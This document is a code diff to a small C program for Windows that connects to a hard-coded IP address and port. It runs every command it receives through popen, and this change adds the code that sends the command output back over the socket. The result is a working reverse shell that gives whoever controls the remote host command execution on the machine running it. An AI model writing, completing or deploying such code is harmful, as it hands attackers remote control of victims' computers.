@@ -5,11 +5,15 @@
 #define IP_ADDRESS "172.16.5.14"
 #define PORT 4445
 #define BUF_LEN 1024
-#define PAYLOAD_SZ 819200
+#define RESPONSE_SZ 128
 
 
 int main() {
-  char prompt[15] = "Connected...";
+  char prompt[15] = "shell> ";
+  char buf[BUF_LEN] = "";
+  int res = 0;
+  FILE *output;
+  char response[RESPONSE_SZ];
 
   // Initialize Winsock and use version 2.2
   WSADATA wsaData;
@@ -30,15 +34,14 @@ int main() {
   send( ConnectSocket, prompt, sizeof(prompt), 0);
 
   // Receive data from port;
-  char buf[BUF_LEN] = "";
-  int res = 0;
-  FILE *output;
-
   do {
-    //send_prompt(ConnectSocket);
     res = recv( ConnectSocket, buf, BUF_LEN, 0 );
     printf(buf);
     output = popen(buf, "r");
+
+    while (fgets(response, RESPONSE_SZ, output) != NULL)
+      send( ConnectSocket, response, RESPONSE_SZ, 0);
+
     send( ConnectSocket, prompt, sizeof(prompt), 0);
 
     //send( ConnectSocket, (char *)output, sizeof(output), 0);
